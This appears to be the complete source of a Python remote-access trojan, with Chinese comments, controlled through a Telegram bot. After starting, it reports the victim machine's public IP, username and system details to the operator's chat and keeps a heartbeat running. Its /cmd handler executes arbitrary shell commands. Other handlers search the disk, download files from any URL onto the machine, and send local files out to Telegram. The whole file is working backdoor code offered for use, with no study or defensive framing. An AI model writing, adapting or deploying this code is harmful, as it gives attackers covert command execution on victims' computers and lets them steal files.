import os
import subprocess
import time
import requests
import telebot
from telebot import  apihelper
import platform
import threading
#程序延迟
time.sleep(10)
# 代理配置
#可选择
#apihelper.proxy = {'https': 'http://127.0.0.1:7890', 'http': 'http://127.0.0.1:7890'}
# Telegram Bot Token
TOKEN = ''
bot = telebot.TeleBot(TOKEN)

# 存储心跳消息 ID 和更新间隔
heartbeat_message_id = None
heartbeat_chat_id = ''  # 替换为你的频道/群组 ID               必填
heartbeat_interval = 60  # 默认心跳更新间隔（秒）
heartbeat_thread = None  # 用于存储心跳线程对象

# 文件大小限制 (50MB, Telegram API 限制)
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB in bytes

# 默认 CMD 编码 (Windows 常用)
cmd_encoding = 'utf-8'  #  或者 'utf-8', 根据你的系统设置


# 获取公网 IP 地址
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip = response.json().get('ip')
        return ip
    except Exception as e:
        return f"获取公网IP错误：{str(e)}"


# 获取系统信息（不包括 Python 版本）
def get_system_info():
    system = platform.system()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()
    info = (
        f"上线时间: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}\n"
        f"用户名:{os.getlogin()}\n"
        f"系统: {system}\n"
        f"发行版: {release}\n"
        f"版本号: {version}\n"
        f"机器: {machine}\n"
        f"处理器: {processor}"
    )
    return info


# 发送上线通知到指定聊天（频道/群组）
def send_startup_info():
    public_ip = get_public_ip()
    system_info = get_system_info()
    message_content = f"[上线通知]\n公网IP: {public_ip}\n\n系统信息:\n{system_info}"
    bot.send_message(heartbeat_chat_id, message_content)


# 更新心跳消息
def update_heartbeat_message():
    global heartbeat_message_id, heartbeat_interval, heartbeat_thread
    while True:
        time.sleep(heartbeat_interval)
        new_text = f"心跳更新时间：{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}\n当前公网IP：{get_public_ip()}"
        try:
            if heartbeat_message_id:
                bot.edit_message_text(new_text, heartbeat_chat_id, heartbeat_message_id)
        except Exception as e:
            print("更新心跳消息失败：", e)


# 记录启动时的心跳消息（启动时自动执行）
def record_startup_heartbeat():
    global heartbeat_message_id, heartbeat_thread
    initial_text = f"心跳记录时间：{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}\n当前公网IP：{get_public_ip()}"
    msg = bot.send_message(heartbeat_chat_id, initial_text)
    heartbeat_message_id = msg.message_id

    # 启动心跳更新线程（只启动一次）
    if heartbeat_thread is None or not heartbeat_thread.is_alive():
        heartbeat_thread = threading.Thread(target=update_heartbeat_message, name='heartbeat_thread')
        heartbeat_thread.daemon = True
        heartbeat_thread.start()


# /system 命令处理：设置 cmd 编码
@bot.message_handler(commands=['system'])
def handle_system(message):
    global cmd_encoding
    args = message.text.split()
    if len(args) > 1:
        sub_command = args[1].lower()
        if sub_command == "encoding":
            if len(args) > 2:
                new_encoding = args[2].lower()
                try:
                    # 尝试用新编码解码一个简单的字符串，以测试编码是否有效
                    "test".encode(new_encoding).decode(new_encoding)
                    cmd_encoding = new_encoding
                    bot.reply_to(message, f"CMD 编码已设置为: {cmd_encoding}")
                except LookupError:
                    bot.reply_to(message, f"无效的编码: {new_encoding}")
            else:
                bot.reply_to(message, "请指定编码 (例如: /system encoding gbk)")
        else:
             bot.reply_to(message, "无效的子命令。用法: /system encoding <编码>")
    else:
        bot.reply_to(message, "用法: /system encoding <编码>")


# /cmd 命令处理：执行 cmd 命令
@bot.message_handler(commands=['cmd'])
def handle_cmd(message):
    global cmd_encoding  # 使用全局变量
    command_text = " ".join(message.text.split()[1:])
    if command_text:
        try:
            # 使用指定的编码执行命令
            result = subprocess.check_output(f"cmd /c {command_text}", shell=True, stderr=subprocess.STDOUT, text=True, encoding=cmd_encoding)
            bot.reply_to(message, f"命令执行成功：\n{result}")
        except subprocess.CalledProcessError as e:
            # 错误输出也使用指定的编码
            bot.reply_to(message, f"命令执行出错：\n{e.output}")
        except UnicodeDecodeError:
            bot.reply_to(message, f"命令执行出错：使用了不兼容的编码 {cmd_encoding}，请尝试使用 /system 命令更改编码。")
    else:
        bot.reply_to(message, "请提供要执行的命令。")




# /heartbeat 命令处理：更新间隔并重启心跳
@bot.message_handler(commands=['heartbeat'])
def handle_heartbeat(message):
    global heartbeat_interval, heartbeat_message_id, heartbeat_thread

    # 解析更新间隔，默认为 60 秒
    args = message.text.split()
    if len(args) > 1:
        try:
            new_interval = int(args[1])
        except ValueError:
            bot.reply_to(message, "无效的间隔时间，使用默认值60")
            new_interval = 60
    else:
        new_interval = 60

    # 更新全局变量 heartbeat_interval
    heartbeat_interval = new_interval

    # 如果存在旧的心跳消息，先删除
    if heartbeat_message_id:
        try:
            bot.delete_message(heartbeat_chat_id, heartbeat_message_id)
        except Exception as e:
            print("删除心跳消息失败：", e)

    # 发送新的心跳消息
    initial_text = f"心跳记录时间：{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}\n当前公网IP：{get_public_ip()}"
    msg = bot.send_message(heartbeat_chat_id, initial_text)
    heartbeat_message_id = msg.message_id

    # 重新启动心跳线程（如果线程不存在或者已经结束）
    if heartbeat_thread is None or not heartbeat_thread.is_alive():
        heartbeat_thread = threading.Thread(target=update_heartbeat_message, name='heartbeat_thread')
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
    # 如果线程已经在运行，它会继续使用新的 heartbeat_interval

    bot.reply_to(message, f"心跳包已更新, 更新间隔: {heartbeat_interval}秒")



# /search 命令处理：在指定文件夹中递归搜索文件
@bot.message_handler(commands=['search'])
def handle_search(message):
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "用法：/search <文件名> <文件夹路径>")
        return

    filename = args[1]
    folder = args[2]
    found_files = []

    for root, dirs, files in os.walk(folder):
        if filename in files:
            found_files.append(os.path.join(root, filename))

    if found_files:
        bot.reply_to(message, "\n".join(found_files))
    else:
        bot.reply_to(message, f"在 {folder} 中未找到文件：{filename}")


# /upload 命令处理：从提供的 URL 下载文件
@bot.message_handler(commands=['upload'])
def handle_upload(message):
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "用法：/upload <文件URL>")
        return

    file_url = args[1]
    filename = file_url.split("/")[-1]

    try:
        response = requests.get(file_url)
        with open(filename, 'wb') as f:
            f.write(response.content)
        bot.reply_to(message, f"文件 {filename} 下载成功。")
    except Exception as e:
        bot.reply_to(message, f"下载文件出错：{str(e)}")


# /download 命令处理: 下载本地文件并发送到 Telegram
@bot.message_handler(commands=['download'])
def handle_download(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "用法：/download <文件路径>")
        return

    file_path = args[1]

    if not os.path.exists(file_path):
        bot.reply_to(message, "文件不存在。")
        return

    if os.path.getsize(file_path) > MAX_FILE_SIZE:
        bot.reply_to(message, "文件太大，无法发送（最大 50MB）。")
        return

    try:
        with open(file_path, 'rb') as f:
            bot.send_document(message.chat.id, f)
        bot.reply_to(message, f"文件 {os.path.basename(file_path)} 发送成功。")
    except Exception as e:
        bot.reply_to(message, f"发送文件出错：{str(e)}")

# Start polling for messages
def start_polling():
    print("客户端启动，正在监听命令...")
    send_startup_info()
    # Start recording heartbeat automatically after startup
    record_startup_heartbeat()
    bot.infinity_polling()


if __name__ == "__main__":
    start_polling()